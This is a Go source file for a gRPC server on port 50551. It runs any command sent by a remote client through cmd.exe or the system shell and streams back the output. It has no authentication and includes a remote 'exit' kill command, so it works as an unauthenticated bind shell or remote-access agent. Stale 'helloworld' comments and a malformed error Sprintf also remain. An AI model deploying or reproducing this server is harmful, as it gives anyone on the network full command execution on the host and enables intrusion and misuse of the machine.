package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	pb "github.com/bartimus-primed/proto/forward/forward_pb"
	"google.golang.org/grpc"
	"google.golang.org/protobuf/types/known/emptypb"
)

const (
	port = ":50551"
)

// server is used to implement helloworld.GreeterServer.
type server struct {
	pb.UnimplementedInteractServer
}

// SayHello implements helloworld.GreeterServer
func (s *server) RunCommandAndRespond(ctx context.Context, in *pb.Command) (*pb.Response, error) {
	log.Printf("Received in responder: %v", in.GetCmd())
	cmd := in.GetCmd()
	out, _ := exec.Command(cmd).Output()
	return &pb.Response{Resp: string(out), Success: true}, nil
}

func (s *server) RunCommand(ctx context.Context, in *pb.Command) (*emptypb.Empty, error) {
	log.Printf("Received: %v", in.GetCmd())
	cmd := in.GetCmd()
	out, _ := exec.Command(cmd).Output()
	fmt.Printf("Running: %s without sending response.", out)
	return &emptypb.Empty{}, nil
}

func (s *server) HandsOn(stream pb.Interact_HandsOnServer) error {
	for {
		in, err := stream.Recv()
		if err == io.EOF {
			fmt.Println("RECEIVED EOF")
			return nil
		}
		if err != nil {
			return err
		}
		cmd := strings.Split(in.GetCmd(), " ")
		for i, a := range cmd {
			cmd[i] = strings.TrimSpace(a)
		}
		if cmd[0] == "exit" {
			fmt.Println("Received kill command")
			stream.Send(&pb.Response{Resp: "exit"})
			time.Sleep(time.Second * 2)
			os.Exit(0)
		}
		log.Printf("Received: %v", in.GetCmd())
		var cmdstruct *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd_clean := []string{"cmd.exe", "/c"}
			for _, a := range cmd {
				cmd_clean = append(cmd_clean, a)
			}
			cmdstruct = &exec.Cmd{
				Path: "cmd.exe",
				Args: cmd_clean,
			}
		} else {
			cmdstruct = exec.Command(os.Getenv("SHELL"), "-c", strings.Join(cmd, " "))
		}
		fmt.Println(cmdstruct.Path, cmdstruct.Args)
		out, err := cmdstruct.CombinedOutput()
		if err != nil {
			stream.Send(&pb.Response{Resp: fmt.Sprintf("Failed with: ", err), Success: false})
		}
		stream.Send(&pb.Response{Resp: string(out), Success: true})
	}
}

func main() {
	lis, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}
	s := grpc.NewServer()
	pb.RegisterInteractServer(s, &server{})
	log.Printf("server listening at %v", lis.Addr())
	if err := s.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}
